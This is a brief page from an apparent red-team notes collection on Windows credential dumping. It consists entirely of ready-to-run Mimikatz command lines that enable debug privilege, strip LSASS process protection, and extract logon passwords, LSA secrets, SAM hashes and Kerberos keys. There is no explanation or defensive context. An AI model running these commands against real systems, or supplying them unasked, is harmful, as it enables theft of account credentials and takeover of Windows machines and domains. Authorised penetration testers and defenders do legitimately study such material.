---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/mimikatz.exe
---

# Mimikatz.exe

```powershell
# logonpasswords
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"

# secrets
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# lsa
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /patch" "exit"

# SAM
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# eKeys 
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::ekeys" "exit"
```
